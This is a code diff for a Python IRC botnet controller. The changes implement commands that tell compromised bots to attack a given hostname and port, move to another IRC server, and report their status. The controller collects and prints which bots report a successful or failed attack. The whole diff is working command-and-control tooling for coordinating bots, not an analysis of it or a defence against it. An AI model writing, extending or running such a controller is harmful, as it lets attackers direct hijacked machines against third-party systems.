@@ -24,39 +24,84 @@ def send_command():
 
 #ids bots and prints out numbers
 def cmd_status():
-	send("PRIVMSG " + channel +" "+"status"+"\n")
+	send("PRIVMSG " + channel +" :"+"status"+"\n")
 	##gets replieds back from irc
 	msg = ""
 	while msg == "":
 		time.sleep(1)
 		msg = rcv_irc_response()
 		msg = msg.strip()
-	
-	i = 0
 	bot_names = []
 	msgs = msg.split("\n")
 	for m in msgs:
-		i = i +1
 		bot_names.append((m[m.find(':', 1)+1:] + "\n").strip())
 		
-	print("num of bots: " + str(i))
+	print("num of bots: " + str(len(bot_names)))
 	print(str(bot_names))
 	#except somerror:
 		#con_active = False
 	
 #tells the bots to attack the hostname
 def cmd_attack(hostname, port):
-	#send a message containing  a counter and the nick of the bot
-	#on next attack increase the counter
+	send("PRIVMSG " + channel +" :"+"attack "+ hostname + " " + port +"\n")
 	#bots send a message back to controller telling if success or not  
+	msg = ""
+	while msg == "":
+		time.sleep(1)
+		msg = rcv_irc_response()
+		msg = msg.strip()
+	successes = []
+	failures = []
+	msgs = msg.split("\n")
+	for m in msgs:
+		bot_status = (m[m.find(':', 1)+1:] + "\n").strip()
+		bot_status = bot_status.split()
+		bot = bot_status[0]
+		status = bot_status[1]
+		if status == "success":
+			successes.append(bot)
+		elif status == "failure":
+			failures.append(bot)
+			
+		
+	print("Successful attack bots: " + str(len(successes)))
+	print(str(successes))
+	print("Failed attacking bots: " + str(len(failures)))
+	print(str(failures))
 	return
 
 
 
 #move bots from current irc to new irc
-def move(hostname, port, channel):
+def cmd_move(hostname, port, channel):
 	#instructs bots to disconnect from current irc and move to another one
+	send("PRIVMSG " + channel +" :"+"move "+ hostname + " " + port + " " + channel + "\n")
+	#bots send a message back to controller telling if success or not  
+	msg = ""
+	while msg == "":
+		time.sleep(1)
+		msg = rcv_irc_response()
+		msg = msg.strip()
+	successes = []
+	failures = []
+	msgs = msg.split("\n")
+	for m in msgs:
+		bot_status = (m[m.find(':', 1)+1:] + "\n").strip()
+		bot_status = bot_status.split()
+		bot = bot_status[0]
+		status = bot_status[1]
+		if status == "success":
+			successes.append(bot)
+		elif status == "failure":
+			failures.append(bot)
+			
+		
+	print("Successfully moved bots: " + str(len(successes)))
+	print(str(successes))
+	print("Failed moving bots: " + str(len(failures)))
+	print(str(failures))
 	return
+
 
 #controller will disconnect from the bots and terminate
 def cmd_quit():	
@@ -125,14 +170,23 @@ def handle_connection():
 				cmd = msg.split()
 						
 				#interpret command
-				if cmd[0] == 'status':	
+				if msg == "\n":
+					pass
+				elif cmd[0] == 'status':	
 					cmd_status()
 				elif cmd[0] == "attack":
-					cmd_attack(cmd[1],cmd[2])
+					try:
+						cmd_attack(cmd[1],cmd[2])
+					except IndexError:
+						print("Error: Insufficient arguments for cmd(attack)")
 				elif cmd[0] == "move":
-					cmd_move(cmd[1], cmd[2], cmd[3]) 
+					try:
+						cmd_move(cmd[1], cmd[2], cmd[3]) 
+					except IndexError:
+						print("Error: Insufficient arguments for cmd(move)")
 				elif cmd[0] == "quit":
-					cmd_quit() 
+					cmd_quit()
+					break 
 				elif cmd[0] == "shutdown":
 					cmd_shutdown()
 				elif con_active == False:
